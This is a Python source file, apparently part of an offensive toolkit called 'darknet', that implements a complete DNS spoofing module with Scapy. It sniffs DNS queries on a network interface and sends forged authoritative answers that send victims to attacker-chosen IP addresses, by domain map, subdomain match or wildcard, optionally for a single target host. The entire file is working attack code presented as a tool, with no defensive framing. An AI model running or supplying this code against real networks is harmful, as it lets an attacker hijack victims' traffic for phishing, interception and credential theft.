"""
DNS spoofing attack module (Bettercap-style)
Intercept and forge DNS responses
"""

from scapy.all import *
from darknet.core.base import AttackModule
from darknet.utils.constants import *
import threading


class DNSSpoof(AttackModule):
    """
    DNS spoofing attack
    Intercepts DNS requests and sends forged responses
    """

    def __init__(self):
        super().__init__(
            name="DNS Spoof",
            description="DNS poisoning attack",
            attack_type="dns_spoof"
        )
        self.target_domain = None
        self.spoof_ip = None
        self.target_ip = None
        self.filter_expression = "udp port 53"
        self.domains_map = {}
        self.wildcard = False

    def setup(self, **kwargs) -> bool:
        """
        Setup DNS spoofing
        Args:
            interface: Network interface
            target_domain: Domain to spoof (e.g., 'example.com')
            spoof_ip: IP to respond with
            target_ip: Target client IP (optional, None for all)
            domains_map: Dict of domain -> IP mappings
            wildcard: Spoof all domains
        """
        try:
            self.interface = kwargs.get('interface')
            self.target_domain = kwargs.get('target_domain')
            self.spoof_ip = kwargs.get('spoof_ip')
            self.target_ip = kwargs.get('target_ip')
            self.domains_map = kwargs.get('domains_map', {})
            self.wildcard = kwargs.get('wildcard', False)

            if not self.interface:
                self.logger.error("Interface required")
                return False

            if not self.spoof_ip and not self.domains_map:
                self.logger.error("Spoof IP or domains map required")
                return False

            # Add single domain to map if provided
            if self.target_domain and self.spoof_ip:
                self.domains_map[self.target_domain] = self.spoof_ip

            self.logger.info(f"DNS spoof configured:")
            if self.wildcard:
                self.logger.info(f"  Mode: Wildcard (all domains -> {self.spoof_ip})")
            else:
                self.logger.info(f"  Spoofed domains:")
                for domain, ip in self.domains_map.items():
                    self.logger.info(f"    {domain} -> {ip}")

            return True

        except Exception as e:
            self.logger.error(f"Setup failed: {e}")
            return False

    def _dns_responder(self, packet):
        """Handle DNS packets and send forged responses"""
        try:
            if packet.haslayer(DNS) and packet.haslayer(DNSQR):
                # Get the query
                query = packet[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')

                # Check if we should spoof this
                spoof_ip = None

                if self.wildcard:
                    spoof_ip = self.spoof_ip
                elif query in self.domains_map:
                    spoof_ip = self.domains_map[query]
                else:
                    # Check for subdomain matches
                    for domain, ip in self.domains_map.items():
                        if query.endswith(domain):
                            spoof_ip = ip
                            break

                if not spoof_ip:
                    return

                # Check if target IP filter applies
                if self.target_ip and packet[IP].src != self.target_ip:
                    return

                # Create forged DNS response
                ip_layer = IP(
                    dst=packet[IP].src,
                    src=packet[IP].dst
                )

                udp_layer = UDP(
                    dport=packet[UDP].sport,
                    sport=packet[UDP].dport
                )

                dns_layer = DNS(
                    id=packet[DNS].id,
                    qr=1,  # Response
                    aa=1,  # Authoritative
                    qd=packet[DNS].qd,
                    an=DNSRR(
                        rrname=packet[DNSQR].qname,
                        ttl=10,
                        rdata=spoof_ip
                    )
                )

                # Build and send response
                spoofed_pkt = ip_layer / udp_layer / dns_layer
                send(spoofed_pkt, verbose=False, iface=self.interface)

                self.packets_sent += 1
                self.success_count += 1

                self.logger.capture(f"DNS spoofed: {query} -> {spoof_ip}")

        except Exception as e:
            self.logger.debug(f"Error handling DNS packet: {e}")

    def run(self) -> dict:
        """Execute DNS spoofing"""
        try:
            self.logger.attack("Starting DNS spoofing")
            self.logger.warning("DNS queries will be intercepted and forged")

            # Start sniffing DNS packets
            sniff(
                iface=self.interface,
                filter=self.filter_expression,
                prn=self._dns_responder,
                store=False,
                stop_filter=lambda x: self._stop_event.is_set()
            )

            self.logger.info("DNS spoofing stopped")

            return {
                'success': True,
                'packets_sent': self.packets_sent,
                'queries_spoofed': self.success_count
            }

        except Exception as e:
            self.logger.error(f"Attack failed: {e}")
            return {'success': False, 'error': str(e)}

    def stop(self):
        """Stop the attack"""
        self._stop_event.set()
        self.logger.info("Stopping DNS spoof")

    def cleanup(self):
        """Cleanup resources"""
        pass
